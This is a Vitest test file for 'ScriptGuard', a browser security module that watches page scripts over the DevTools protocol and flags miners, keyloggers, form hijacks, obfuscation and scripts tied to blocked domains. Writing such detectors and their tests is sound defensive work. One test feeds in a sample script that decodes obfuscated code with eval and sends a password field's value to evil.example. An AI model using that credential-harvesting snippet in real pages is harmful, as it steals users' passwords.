import { describe, it, expect, beforeEach, vi } from 'vitest';
import { ScriptGuard, type ScriptCriticalDetection } from '../script-guard';
import type { SecurityDB } from '../security-db';
import type { Guardian } from '../guardian';
import type { DevToolsManager } from '../../devtools/manager';
import type { SecurityEvent } from '../types';

/**
 * ScriptGuard is a CDP-driven module — nearly all flows are triggered by
 * `devToolsManager.subscribe` handlers. We capture the registered handlers
 * and invoke them directly to simulate CDP events.
 */

type SubscribeHandler = (method: string, params: Record<string, unknown>) => void;

interface MockDevTools {
  subscribe: ReturnType<typeof vi.fn>;
  unsubscribe: ReturnType<typeof vi.fn>;
  sendCommandToTab: ReturnType<typeof vi.fn>;
  getAttachedWebContents: ReturnType<typeof vi.fn>;
  getDispatchWebContents: ReturnType<typeof vi.fn>;
  handlers: Map<string, SubscribeHandler>;
  fire: (subName: string, method: string, params: Record<string, unknown>) => void;
}

function makeDevTools(currentUrl = 'https://page.example', wcId = 42): MockDevTools {
  const handlers = new Map<string, SubscribeHandler>();
  const wc = { id: wcId, getURL: () => currentUrl };

  const dt: MockDevTools = {
    handlers,
    subscribe: vi.fn((sub: { name: string; handler: SubscribeHandler }) => {
      handlers.set(sub.name, sub.handler);
    }),
    unsubscribe: vi.fn((name: string) => handlers.delete(name)),
    sendCommandToTab: vi.fn(async () => ({})),
    getAttachedWebContents: vi.fn(() => wc),
    getDispatchWebContents: vi.fn(() => wc),
    fire: (subName, method, params) => {
      const h = handlers.get(subName);
      if (!h) throw new Error(`No subscriber named "${subName}" registered`);
      h(method, params);
    },
  };
  return dt;
}

function makeDB(overrides: Partial<Record<string, unknown>> = {}): SecurityDB & {
  events: SecurityEvent[];
  fingerprints: Map<string, { trusted: boolean }>;
} {
  const events: SecurityEvent[] = [];
  const fingerprints = new Map<string, { trusted: boolean }>();
  const base = {
    events,
    fingerprints,
    logEvent: vi.fn((e: SecurityEvent) => { events.push(e); return events.length; }),
    getScriptFingerprint: vi.fn((domain: string, url: string) => {
      const fp = fingerprints.get(`${domain}|${url}`);
      return fp ? { id: 1, domain, scriptUrl: url, scriptHash: null, firstSeen: 0, lastSeen: 0, trusted: fp.trusted } : null;
    }),
    getDomainInfo: vi.fn(() => null),
    upsertScriptFingerprint: vi.fn(),
    updateScriptHash: vi.fn(),
    updateNormalizedHash: vi.fn(),
    updateAstHash: vi.fn(),
    updateAstFeatures: vi.fn(),
    markScriptHashAnalyzed: vi.fn(),
    isScriptHashAnalyzed: vi.fn(() => false),
    getDomainsForHash: vi.fn(() => []),
    getDomainsForNormalizedHash: vi.fn(() => []),
    getDomainsForAstHash: vi.fn(() => []),
    getAstMatches: vi.fn(() => []),
    getScriptsWithAstFeatures: vi.fn(() => []),
    ...overrides,
  };
  return base as unknown as SecurityDB & { events: SecurityEvent[]; fingerprints: Map<string, { trusted: boolean }> };
}

const FAKE_GUARDIAN = {} as Guardian;

describe('ScriptGuard', () => {
  describe('construction & subscriptions', () => {
    it('registers itself with the DevToolsManager on construction', () => {
      const dt = makeDevTools();
      new ScriptGuard(makeDB(), FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      expect(dt.subscribe).toHaveBeenCalled();
      // The main subscriber listens for Debugger.scriptParsed and Runtime.consoleAPICalled
      const call = dt.subscribe.mock.calls.find(c => c[0].name === 'ScriptGuard');
      expect(call).toBeDefined();
      expect(call![0].events).toContain('Debugger.scriptParsed');
      expect(call![0].events).toContain('Runtime.consoleAPICalled');
    });

    it('unsubscribes on destroy', () => {
      const dt = makeDevTools();
      const guard = new ScriptGuard(makeDB(), FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      guard.destroy();
      expect(dt.unsubscribe).toHaveBeenCalledWith('ScriptGuard');
      expect(dt.unsubscribe).toHaveBeenCalledWith('ScriptGuard:Alerts');
    });
  });

  describe('analyzeScript (Debugger.scriptParsed)', () => {
    let dt: MockDevTools;
    let db: ReturnType<typeof makeDB>;
    let guard: ScriptGuard;

    beforeEach(() => {
      dt = makeDevTools('https://page.example');
      db = makeDB();
      guard = new ScriptGuard(db, FAKE_GUARDIAN, dt as unknown as DevToolsManager);
    });

    it('ignores inline scripts (no URL)', () => {
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', { scriptId: 'a', length: 100 });
      expect(db.upsertScriptFingerprint).not.toHaveBeenCalled();
    });

    it('ignores chrome-extension, devtools, debugger URLs', () => {
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', { scriptId: 'a', url: 'chrome-extension://abc/bg.js' });
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', { scriptId: 'b', url: 'devtools://foo/bar.js' });
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', { scriptId: 'c', url: 'debugger://internal.js' });
      expect(db.upsertScriptFingerprint).not.toHaveBeenCalled();
    });

    it('skips trusted scripts already in fingerprint DB', () => {
      db.fingerprints.set('cdn.example|https://cdn.example/lib.js', { trusted: true });
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://cdn.example/lib.js',
        length: 1000,
      });
      // Trusted scripts are short-circuited before upsert
      expect(db.upsertScriptFingerprint).not.toHaveBeenCalled();
    });

    it('flags NEW scripts appearing on frequently-visited domains', () => {
      (db.getDomainInfo as ReturnType<typeof vi.fn>).mockReturnValue({
        domain: 'visited.example',
        visitCount: 10,
        firstSeen: 0,
        lastSeen: 0,
        trustScore: 50,
      });
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://visited.example/new-script.js',
        length: 500,
      });
      const warn = db.events.find(e => e.eventType === 'warned' && e.category === 'script');
      expect(warn).toBeDefined();
      expect(warn?.severity).toBe('medium');
    });

    it('does NOT flag new scripts on unknown/new domains (no prior visits)', () => {
      // getDomainInfo returns null by default → domain not visited enough
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://unknown.example/script.js',
        length: 500,
      });
      expect(db.events.find(e => e.eventType === 'warned')).toBeUndefined();
    });

    it('upserts script fingerprint on parse', () => {
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://external.example/tracker.js',
        length: 500,
        hash: 'abc123',
      });
      expect(db.upsertScriptFingerprint).toHaveBeenCalledWith('external.example', 'https://external.example/tracker.js', 'abc123');
    });

    it('triggers hash correlation when CDP provides a hash', () => {
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://external.example/tracker.js',
        length: 500,
        hash: 'deadbeef',
      });
      expect(db.getDomainsForHash).toHaveBeenCalledWith('deadbeef');
    });

    it('stores parsed script in per-tab state (retrievable via getScriptsParsed)', () => {
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://external.example/lib.js',
        length: 123,
      });
      const parsed = guard.getScriptsParsed(42);
      expect(parsed.get('s1')).toEqual({ url: 'https://external.example/lib.js', length: 123 });
    });
  });

  describe('hash correlation (critical path)', () => {
    let dt: MockDevTools;
    let db: ReturnType<typeof makeDB>;
    let guard: ScriptGuard;
    let detections: ScriptCriticalDetection[];

    beforeEach(() => {
      dt = makeDevTools('https://current.example');
      db = makeDB();
      guard = new ScriptGuard(db, FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      detections = [];
      guard.onCriticalDetection = (d) => detections.push(d);
    });

    it('logs critical event and fires callback when hash was seen on a blocked domain', () => {
      (db.getDomainsForHash as ReturnType<typeof vi.fn>).mockReturnValue(['evil.example', 'current.example']);
      guard.isDomainBlocked = (d) => d === 'evil.example';

      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://current.example/a.js',
        hash: 'sharedhash',
      });

      const ev = db.events.find(e => e.eventType === 'script-on-blocked-domain');
      expect(ev).toBeDefined();
      expect(ev?.severity).toBe('critical');
      expect(detections).toHaveLength(1);
      expect(detections[0].source).toBe('hash-correlation');
    });

    it('flags widespread scripts seen on 5+ domains as low-severity', () => {
      (db.getDomainsForHash as ReturnType<typeof vi.fn>).mockReturnValue([
        'a.example', 'b.example', 'c.example', 'd.example', 'e.example', 'f.example'
      ]);
      guard.isDomainBlocked = () => false;

      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1',
        url: 'https://current.example/a.js',
        hash: 'widehash',
      });
      const ev = db.events.find(e => e.eventType === 'widespread-script');
      expect(ev).toBeDefined();
      expect(ev?.severity).toBe('low');
    });

    it('does not flag scripts on fewer than 5 domains', () => {
      (db.getDomainsForHash as ReturnType<typeof vi.fn>).mockReturnValue(['a.example', 'b.example']);
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1', url: 'https://current.example/x.js', hash: 'rareHash',
      });
      expect(db.events.find(e => e.eventType === 'widespread-script')).toBeUndefined();
    });
  });

  describe('console monitoring (crypto miner detection)', () => {
    let dt: MockDevTools;
    let db: ReturnType<typeof makeDB>;

    beforeEach(() => {
      dt = makeDevTools('https://miner.example');
      db = makeDB();
      new ScriptGuard(db, FAKE_GUARDIAN, dt as unknown as DevToolsManager);
    });

    it('flags coinhive references in console errors', () => {
      dt.fire('ScriptGuard', 'Runtime.consoleAPICalled', {
        type: 'error',
        args: [{ value: 'CoinHive worker failed to load' }],
      });
      const ev = db.events.find(e => e.category === 'script' && e.severity === 'high');
      expect(ev).toBeDefined();
    });

    it('flags cryptonight references in console warnings', () => {
      dt.fire('ScriptGuard', 'Runtime.consoleAPICalled', {
        type: 'warning',
        args: [{ description: 'cryptonight algorithm slow' }],
      });
      expect(db.events.find(e => e.category === 'script' && e.severity === 'high')).toBeDefined();
    });

    it('ignores non-error/warning console calls', () => {
      dt.fire('ScriptGuard', 'Runtime.consoleAPICalled', {
        type: 'log',
        args: [{ value: 'coinhive test' }],
      });
      expect(db.events).toHaveLength(0);
    });

    it('ignores unrelated error messages', () => {
      dt.fire('ScriptGuard', 'Runtime.consoleAPICalled', {
        type: 'error',
        args: [{ value: 'TypeError: undefined is not a function' }],
      });
      expect(db.events).toHaveLength(0);
    });
  });

  describe('injectMonitors', () => {
    let dt: MockDevTools;
    let guard: ScriptGuard;

    beforeEach(() => {
      dt = makeDevTools('https://page.example', 42);
      guard = new ScriptGuard(makeDB(), FAKE_GUARDIAN, dt as unknown as DevToolsManager);
    });

    it('registers the __tandemSecurityAlert binding', async () => {
      await guard.injectMonitors(42);
      const bindingCall = dt.sendCommandToTab.mock.calls.find(c => c[1] === 'Runtime.addBinding');
      expect(bindingCall).toBeDefined();
      expect(bindingCall![2]).toEqual({ name: '__tandemSecurityAlert' });
    });

    it('injects the monitor script via Page.addScriptToEvaluateOnNewDocument', async () => {
      await guard.injectMonitors(42);
      const pageCall = dt.sendCommandToTab.mock.calls.find(c => c[1] === 'Page.addScriptToEvaluateOnNewDocument');
      expect(pageCall).toBeDefined();
      // Should include the monitor source and use the main world
      const args = pageCall![2] as { source: string; worldName: string };
      expect(args.source).toContain('__tandemSecurityMonitorsActive');
      expect(args.worldName).toBe('');
    });

    it('also runs the script immediately via Runtime.evaluate', async () => {
      await guard.injectMonitors(42);
      const runtimeCall = dt.sendCommandToTab.mock.calls.find(c => c[1] === 'Runtime.evaluate');
      expect(runtimeCall).toBeDefined();
    });

    it('is idempotent — second call does not re-inject', async () => {
      await guard.injectMonitors(42);
      const firstCallCount = dt.sendCommandToTab.mock.calls.length;
      await guard.injectMonitors(42);
      expect(dt.sendCommandToTab.mock.calls.length).toBe(firstCallCount);
      expect(guard.hasMonitorsInjected(42)).toBe(true);
    });

    it('returns silently when no wcId can be resolved', async () => {
      dt.getAttachedWebContents.mockReturnValue(null);
      dt.getDispatchWebContents.mockReturnValue(null);
      await expect(guard.injectMonitors()).resolves.toBeUndefined();
      expect(dt.sendCommandToTab).not.toHaveBeenCalled();
    });

    it('gracefully handles CDP errors during injection', async () => {
      dt.sendCommandToTab.mockRejectedValue(new Error('tab closed'));
      // Should not throw
      await expect(guard.injectMonitors(42)).resolves.toBeUndefined();
      expect(guard.hasMonitorsInjected(42)).toBe(false);
    });

    it('registers the ScriptGuard:Alerts subscriber for binding events', async () => {
      await guard.injectMonitors(42);
      expect(dt.handlers.has('ScriptGuard:Alerts')).toBe(true);
    });
  });

  describe('security alerts (handleSecurityAlert via binding events)', () => {
    let dt: MockDevTools;
    let db: ReturnType<typeof makeDB>;
    let guard: ScriptGuard;

    beforeEach(async () => {
      dt = makeDevTools('https://target.example', 42);
      db = makeDB();
      guard = new ScriptGuard(db, FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      await guard.injectMonitors(42);
    });

    const fireAlert = (alert: Record<string, unknown>) => {
      dt.fire('ScriptGuard:Alerts', 'Runtime.bindingCalled', {
        name: '__tandemSecurityAlert',
        payload: JSON.stringify(alert),
      });
    };

    it('logs high-severity keylogger_suspect alerts', () => {
      fireAlert({ type: 'keylogger_suspect', eventType: 'keydown', elementTag: 'INPUT', elementName: 'password' });
      const ev = db.events.find(e => e.category === 'script' && e.severity === 'high');
      expect(ev).toBeDefined();
    });

    it('tracks WASM instantiation events and logs medium severity', () => {
      fireAlert({ type: 'wasm_instantiate' });
      fireAlert({ type: 'wasm_instantiate' });
      const wasmEvents = db.events.filter(e => e.category === 'behavior');
      expect(wasmEvents.length).toBe(2);
      expect(guard.getRecentWasmCount(42)).toBe(2);
    });

    it('logs clipboard_read alerts as medium severity', () => {
      fireAlert({ type: 'clipboard_read' });
      const ev = db.events.find(e => e.category === 'behavior' && e.severity === 'medium');
      expect(ev).toBeDefined();
    });

    it('flags external form_action_change as high severity', () => {
      fireAlert({
        type: 'form_action_change',
        newAction: 'https://evil.example/steal',
        formId: 'login-form',
      });
      const ev = db.events.find(e => e.category === 'script' && e.severity === 'high');
      expect(ev).toBeDefined();
    });

    it('does NOT flag same-domain form_action_change', () => {
      fireAlert({
        type: 'form_action_change',
        newAction: 'https://target.example/new-endpoint',
        formId: 'login-form',
      });
      expect(db.events.find(e => e.category === 'script')).toBeUndefined();
    });

    it('ignores unknown alert types silently', () => {
      fireAlert({ type: 'unknown_type', data: 'anything' });
      expect(db.events).toHaveLength(0);
    });

    it('survives malformed JSON payloads without throwing', () => {
      // Directly fire invalid JSON; handler must catch
      expect(() => dt.fire('ScriptGuard:Alerts', 'Runtime.bindingCalled', {
        name: '__tandemSecurityAlert',
        payload: 'not-json{{',
      })).not.toThrow();
      expect(db.events).toHaveLength(0);
    });

    it('ignores binding calls with other names', () => {
      dt.fire('ScriptGuard:Alerts', 'Runtime.bindingCalled', {
        name: 'someOtherBinding',
        payload: JSON.stringify({ type: 'keylogger_suspect' }),
      });
      expect(db.events).toHaveLength(0);
    });
  });

  describe('WASM tracking window', () => {
    it('getRecentWasmCount returns 0 for tabs that never reported WASM', () => {
      const dt = makeDevTools();
      const guard = new ScriptGuard(makeDB(), FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      expect(guard.getRecentWasmCount(42)).toBe(0);
    });

    it('resolves the current wcId when none is supplied', async () => {
      const dt = makeDevTools('https://page.example', 99);
      const guard = new ScriptGuard(makeDB(), FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      await guard.injectMonitors(99);
      dt.fire('ScriptGuard:Alerts', 'Runtime.bindingCalled', {
        name: '__tandemSecurityAlert',
        payload: JSON.stringify({ type: 'wasm_instantiate' }),
      });
      // No explicit wcId — should still find the active tab via getAttachedWebContents
      expect(guard.getRecentWasmCount()).toBe(1);
    });
  });

  describe('tab state management', () => {
    let dt: MockDevTools;
    let guard: ScriptGuard;

    beforeEach(() => {
      dt = makeDevTools('https://page.example', 42);
      guard = new ScriptGuard(makeDB(), FAKE_GUARDIAN, dt as unknown as DevToolsManager);
    });

    it('hasMonitorsInjected is false for fresh tabs', () => {
      expect(guard.hasMonitorsInjected(42)).toBe(false);
    });

    it('hasMonitorsInjected is true after injection', async () => {
      await guard.injectMonitors(42);
      expect(guard.hasMonitorsInjected(42)).toBe(true);
    });

    it('reset(wcId) clears tab state', async () => {
      await guard.injectMonitors(42);
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1', url: 'https://external.example/x.js', length: 100,
      });
      expect(guard.hasMonitorsInjected(42)).toBe(true);
      expect(guard.getScriptsParsed(42).size).toBe(1);

      guard.reset(42);
      expect(guard.hasMonitorsInjected(42)).toBe(false);
      expect(guard.getScriptsParsed(42).size).toBe(0);
    });

    it('reset() with no arguments clears all tabs', async () => {
      await guard.injectMonitors(42);
      guard.reset();
      expect(guard.hasMonitorsInjected(42)).toBe(false);
    });

    it('clearTab removes the tab state entirely', async () => {
      await guard.injectMonitors(42);
      guard.clearTab(42);
      expect(guard.hasMonitorsInjected(42)).toBe(false);
    });

    it('getScriptsParsed returns an empty Map when no wcId resolvable', () => {
      dt.getAttachedWebContents.mockReturnValue(null);
      dt.getDispatchWebContents.mockReturnValue(null);
      expect(guard.getScriptsParsed()).toEqual(new Map());
    });
  });

  describe('analyzeExternalScript (async CDP script source analysis)', () => {
    let dt: MockDevTools;
    let db: ReturnType<typeof makeDB>;
    let guard: ScriptGuard;
    let detections: ScriptCriticalDetection[];

    beforeEach(() => {
      dt = makeDevTools('https://page.example', 42);
      db = makeDB();
      guard = new ScriptGuard(db, FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      detections = [];
      guard.onCriticalDetection = (d) => detections.push(d);
    });

    /** Trigger analyzeExternalScript via the public Debugger.scriptParsed path */
    const fireExternalScript = (source: string, url = 'https://ext.example/evil.js') => {
      dt.sendCommandToTab.mockImplementation(async (_wcId, method) => {
        if (method === 'Debugger.getScriptSource') return { scriptSource: source };
        return {};
      });
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1', url, length: source.length,
      });
      // analyzeExternalScript fires in background — yield so the promise resolves
      return new Promise(resolve => setImmediate(resolve));
    };

    it('skips analysis for trusted CDN domains (rule engine bypassed)', async () => {
      await fireExternalScript('eval("malicious")', 'https://cdn.jsdelivr.net/lib.js');
      // Trusted CDN → no script-analysis event even though eval() matches a rule
      expect(db.events.find(e => e.eventType === 'script-analysis')).toBeUndefined();
    });

    it('runs the rule engine and logs script-analysis events on rule matches', async () => {
      // eval_string rule → score 25 → severity "medium"
      await fireExternalScript('eval("runMe()");');
      const ev = db.events.find(e => e.eventType === 'script-analysis');
      expect(ev).toBeDefined();
      expect(['low', 'medium', 'high', 'critical']).toContain(ev!.severity);
    });

    it('fires onCriticalDetection callback for critical-severity rule matches', async () => {
      // eval_fromcharcode (35) + eval_atob (30) + credential_harvest (45) = 110 → critical
      const badSource = `
        eval(String.fromCharCode(97,98,99));
        eval(atob("base64here"));
        var p = document.querySelector('input[name="password"]');
        fetch('https://evil.example', { body: p.value });
      `;
      await fireExternalScript(badSource);
      const ev = db.events.find(e => e.eventType === 'script-analysis' && e.severity === 'critical');
      expect(ev).toBeDefined();
      expect(detections.length).toBeGreaterThan(0);
      expect(detections[0].source).toBe('script-analysis');
    });

    it('logs high-entropy warning events for obfuscated-looking scripts', async () => {
      // Build a high-entropy payload > 1000 chars to trigger entropy analysis.
      // Use truly random-looking bytes (base64-ish) to push entropy > 6.0.
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
      let payload = '';
      for (let i = 0; i < 2000; i++) {
        payload += chars[Math.floor(Math.random() * chars.length)];
      }
      const source = `var x="${payload}";`;
      await fireExternalScript(source);
      const entropyEvent = db.events.find(e =>
        e.eventType === 'warned' &&
        e.category === 'script' &&
        e.details.includes('high-entropy-script')
      );
      expect(entropyEvent).toBeDefined();
    });

    it('updates script, normalized, and AST hashes in the DB', async () => {
      await fireExternalScript('const x = 1 + 2;');
      expect(db.updateScriptHash).toHaveBeenCalled();
      expect(db.updateNormalizedHash).toHaveBeenCalled();
      expect(db.updateAstHash).toHaveBeenCalled();
      expect(db.updateAstFeatures).toHaveBeenCalled();
    });

    it('does not re-analyze scripts whose hash is already in the cache', async () => {
      (db.isScriptHashAnalyzed as ReturnType<typeof vi.fn>).mockReturnValue(true);
      await fireExternalScript('eval("dangerous")');
      // Cache hit → early return before rule engine runs
      expect(db.events.find(e => e.eventType === 'script-analysis')).toBeUndefined();
    });

    it('marks the hash as analyzed after a successful pass', async () => {
      await fireExternalScript('const safe = 1;');
      expect(db.markScriptHashAnalyzed).toHaveBeenCalled();
    });

    it('handles CDP errors gracefully (no throw, no logs)', async () => {
      dt.sendCommandToTab.mockRejectedValue(new Error('debugger detached'));
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1', url: 'https://ext.example/x.js', length: 100,
      });
      await new Promise(resolve => setImmediate(resolve));
      // Should not have thrown and the analysis events should be absent
      expect(db.events.find(e => e.eventType === 'script-analysis')).toBeUndefined();
    });

    it('skips rule engine for scripts larger than MAX_SCRIPT_SIZE', async () => {
      // analyzeScript itself gates on length before calling analyzeExternalScript
      const big = 'x'.repeat(600 * 1024);
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1', url: 'https://ext.example/big.js', length: big.length,
      });
      await new Promise(resolve => setImmediate(resolve));
      expect(dt.sendCommandToTab).not.toHaveBeenCalledWith(
        expect.anything(), 'Debugger.getScriptSource', expect.anything()
      );
    });

    it('skips analyzing external scripts when page domain equals script domain', async () => {
      // Same-origin script → analyzeScript short-circuits before analyzeExternalScript
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', {
        scriptId: 's1', url: 'https://page.example/first-party.js', length: 100,
      });
      await new Promise(resolve => setImmediate(resolve));
      expect(dt.sendCommandToTab).not.toHaveBeenCalledWith(
        expect.anything(), 'Debugger.getScriptSource', expect.anything()
      );
    });
  });

  describe('AST correlation (obfuscation-variant detection)', () => {
    let dt: MockDevTools;
    let db: ReturnType<typeof makeDB>;
    let guard: ScriptGuard;
    let detections: ScriptCriticalDetection[];

    beforeEach(() => {
      dt = makeDevTools('https://page.example', 42);
      db = makeDB();
      guard = new ScriptGuard(db, FAKE_GUARDIAN, dt as unknown as DevToolsManager);
      detections = [];
      guard.onCriticalDetection = (d) => detections.push(d);
    });

    const fireExternalScript = (source: string, url = 'https://ext.example/s.js') => {
      dt.sendCommandToTab.mockImplementation(async (_wcId, method) => {
        if (method === 'Debugger.getScriptSource') return { scriptSource: source };
        return {};
      });
      dt.fire('ScriptGuard', 'Debugger.scriptParsed', { scriptId: 's1', url, length: source.length });
      return new Promise(resolve => setImmediate(resolve));
    };

    it('flags scripts with AST hash matching a blocked domain as critical', async () => {
      // Prep: the AST hash we'll compute for "const x = 1" matches a known bad domain
      (db.getDomainsForAstHash as ReturnType<typeof vi.fn>).mockReturnValue(['evil.example', 'ext.example']);
      guard.isDomainBlocked = (d) => d === 'evil.example';

      await fireExternalScript('const x = 1;');

      const ev = db.events.find(e => e.eventType === 'obfuscated-script-from-blocked-domain');
      expect(ev).toBeDefined();
      expect(ev?.severity).toBe('critical');
      expect(detections.some(d => d.source === 'ast-correlation')).toBe(true);
    });

    it('flags obfuscation variants: 3+ domains with same AST but different surface hashes', async () => {
      (db.getDomainsForAstHash as ReturnType<typeof vi.fn>).mockReturnValue(['a.example', 'b.example', 'c.example']);
      (db.getAstMatches as ReturnType<typeof vi.fn>).mockReturnValue([
        { scriptHash: 'hashA' }, { scriptHash: 'hashB' }, { scriptHash: 'hashC' },
      ]);
      guard.isDomainBlocked = () => false;

      await fireExternalScript('const y = 2;');

      const ev = db.events.find(e => e.eventType === 'obfuscation-variant-detected');
      expect(ev).toBeDefined();
      expect(ev?.severity).toBe('medium');
    });
  });

  describe('re-exports (backward compat)', () => {
    it('re-exports the pure utility functions from script-utils', async () => {
      const mod = await import('../script-guard');
      expect(typeof mod.calculateEntropy).toBe('function');
      expect(typeof mod.normalizeScriptSource).toBe('function');
      expect(typeof mod.computeASTHash).toBe('function');
      expect(typeof mod.computeSimilarity).toBe('function');
      // Sanity: the re-exports must match behavior of the originals
      expect(mod.calculateEntropy('')).toBe(0);
      expect(mod.normalizeScriptSource('  a  b  ')).toBe('a b');
    });
  });
});
